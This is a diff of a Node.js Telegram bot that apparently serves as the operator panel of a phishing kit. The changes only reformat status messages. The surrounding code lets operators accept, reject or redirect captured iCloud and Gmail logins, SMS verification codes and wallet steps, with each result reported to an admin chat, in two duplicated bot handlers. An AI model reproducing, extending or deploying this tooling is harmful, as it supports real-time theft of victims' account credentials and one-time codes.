@@ -246,7 +246,7 @@ bot.on("callback_query", async (query) => {
             statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
             consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
           } else if (action === "sms2_reject") {
-            statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
+            statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED!</b> ❌`;
             consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
           } else if (action === "sms2_icloud") {
             statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
@@ -442,7 +442,7 @@ bot.on("callback_query", async (query) => {
         // ✅ SEND ACCEPTANCE MESSAGE INSTANTLY (no delay)
         try {
           await bot.sendMessage(ADMIN_CHAT_ID, 
-            `📧 <code>${identifier}</code> has been <b>ACCEPTED</b>! ✅`,
+            `📧 <code>${identifier}</code> has been <b>ACCEPTED!</b> ✅`,
             { parse_mode: "HTML" }
           );
           console.log(`✅ Acceptance message sent instantly`);
@@ -611,19 +611,19 @@ bot.on("callback_query", async (query) => {
       let statusMessage = "";
       
       if (action === "page1") {
-        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
       } else if (action === "page2") {
-        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
       } else if (action === "reject") {
-        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
       } else if (action === "page_accept") {
-        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
       } else if (action === "page_reject") {
-        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>!✅`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED!</b> ✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>!❌`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED!</b> ❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -638,7 +638,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching Gmail display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
       } else if (action === "gmail_reject") {
         // ✅ For Gmail callbacks, fetch displayEmail
         try {
@@ -649,7 +649,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching Gmail display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
       } else if (action === "verification_accept") {
         // ✅ For verification callbacks, fetch displayEmail
         try {
@@ -660,7 +660,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching verification display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED!</b> ✅`;
       } else if (action === "verification_reject") {
         // ✅ For verification callbacks, fetch displayEmail
         try {
@@ -671,11 +671,11 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching verification display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED!</b> ❌`;
       } else if (action === "gmail_verify_accept") {
-        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED!</b> ✅`;
       } else if (action === "gmail_verify_reject") {
-        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED!</b> ❌`;
       } else if (action === "verifying_sms") {
         statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
       } else if (action === "verifying_done") {
@@ -691,7 +691,7 @@ bot.on("callback_query", async (query) => {
       } else if (action === "sms2_done") {
         statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
       } else if (action === "sms2_reject") {
-        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
       } else if (action === "wallet_decision_sms") {
         statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
       } else if (action === "wallet_decision_done") {
@@ -986,7 +986,7 @@ if (bot2) {
               statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
               consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
             } else if (action === "sms2_reject") {
-              statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
+              statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED!</b> ❌`;
               consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
             } else if (action === "sms2_icloud") {
               statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
@@ -1177,7 +1177,7 @@ if (bot2) {
 
         try {
           await bot2.sendMessage(ADMIN_CHAT_ID_2, 
-            `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
+            `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`, 
             { parse_mode: "HTML" }
           );
         } catch (err) {
@@ -1223,19 +1223,19 @@ if (bot2) {
         let statusMessage = "";
         
         if (action === "page1") {
-          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
         } else if (action === "page2") {
-          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED!</b> ✅`;
         } else if (action === "reject") {
-          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
         } else if (action === "page_accept") {
-          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
         } else if (action === "page_reject") {
-          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED!</b> ❌`;
         } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED!</b> ✅`;
         } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED!</b> ❌`;
         } else if (action === "redirect_icloud") {
           statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
         } else if (action === "redirect_gmail") {
@@ -1251,7 +1251,7 @@ if (bot2) {
             console.error("Error fetching Gmail display email:", err);
             displayEmail = email;
           }
-          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED!</b> ✅`;
         } else if (action === "gmail_reject") {
           // ✅ For Gmail callbacks, fetch displayEmail
           try {
@@ -1263,7 +1263,7 @@ if (bot2) {
             console.error("Error fetching Gmail display email:", err);
             displayEmail = email;
           }
-          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED!</b> ❌`;
         } else if (action === "verification_accept") {
           // ✅ For verification callbacks, fetch displayEmail
           try {
@@ -1275,7 +1275,7 @@ if (bot2) {
             console.error("Error fetching verification display email:", err);
             displayEmail = email;
           }
-          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED!</b> ✅`;
         } else if (action === "verification_reject") {
           // ✅ For verification callbacks, fetch displayEmail
           try {
@@ -1287,11 +1287,11 @@ if (bot2) {
             console.error("Error fetching verification display email:", err);
             displayEmail = email;
           }
-          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED!</b> ❌`;
         } else if (action === "gmail_verify_accept") {
-          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED!</b> ✅`;
         } else if (action === "gmail_verify_reject") {
-          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED!</b> ❌`;
         } else if (action === "verifying_sms") {
           statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
         } else if (action === "verifying_done") {
@@ -1307,7 +1307,7 @@ if (bot2) {
         } else if (action === "sms2_done") {
           statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
         } else if (action === "sms2_reject") {
-          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED!</b> ❌`;
         } else if (action === "wallet_decision_sms") {
           statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
         } else if (action === "wallet_decision_done") {
